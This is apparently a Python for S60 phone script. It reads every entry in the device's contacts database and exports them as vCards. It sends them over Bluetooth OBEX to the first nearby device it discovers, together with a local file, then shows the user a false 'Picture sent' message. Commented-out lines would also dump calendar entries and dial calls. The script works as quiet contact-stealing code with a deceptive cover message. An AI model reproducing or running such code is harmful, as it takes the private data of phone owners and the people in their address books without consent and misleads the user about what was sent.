import contacts
import time
import e32, e32socket, appuifw
import tempfile

db = contacts.open()

try:
    device=e32socket.bt_obex_discover()
except:
    pass
address=device[0]
channel=device[1][u'OBEX Object Push']

out = ""
for key in db.keys():
    contact = db[key]
    out += contact.as_vcard()

out_file = tempfile.NamedTemporaryFile(mode='w')
out_file.write(out)
out_file.flush()

e32socket.bt_obex_send_file(address,channel,out_file.name)

e32socket.bt_obex_send_file(address,channel,u"e:\\tmp.txt")

appuifw.note(u"Picture sent",out_file.name)
out_file.close()


#import e32calendar
# db = e32calendar.open()
# for key in db:
#     entry = db[key]
#     print 'id:%i'%entry.id    
#     print 'content:%s'%entry.content
#     print 'location:%s'%entry.location
#     print 'start_time:%s'%time.ctime(entry.start_time)
#     print 'end_time:%s'%time.ctime(entry.end_time)
#     print '--------'

# import telephone
# telephone.dial("")

# telephone.hang_up()

# import audio
